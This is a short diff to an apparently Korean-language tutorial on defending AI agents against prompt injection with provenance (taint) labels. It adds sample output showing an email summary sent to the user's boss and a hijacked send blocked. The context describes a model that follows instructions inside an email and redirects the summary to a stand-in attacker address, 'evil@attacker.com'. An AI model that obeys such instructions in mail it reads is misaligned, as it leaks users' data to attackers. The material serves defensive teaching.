@@ -79,6 +79,12 @@ hijacked_to = combine(lambda m: "evil@attacker.com", inbox)   # 메일에서 만
 print(send_email(hijacked_to, summary))
 \`\`\`
 
+\`\`\`output
+요약의 출처: ['inbox', 'user']
+발송 완료 → boss@company.com
+차단: 수신자 출처 ['inbox']
+\`\`\`
+
 요약문은 사용자 요청과 외부 메일을 모두 입력으로 사용했으므로 출처 표지가 \`{user, inbox}\`다. 정책은 **수신자**만 검사하므로, 사용자가 지정한 상사에게 요약을 보내는 것은 통과한다. 모델이 메일 속 지시에 따라 수신자를 공격자 주소로 바꿔도, 그 주소는 메일에서 만들어진 값이므로 \`inbox\` 출처 표지가 적용되어 차단된다. 모델의 출력과 관계없이 결과가 정해진다는 점이 핵심이다.
 
 [[diagram:taint-propagation]]
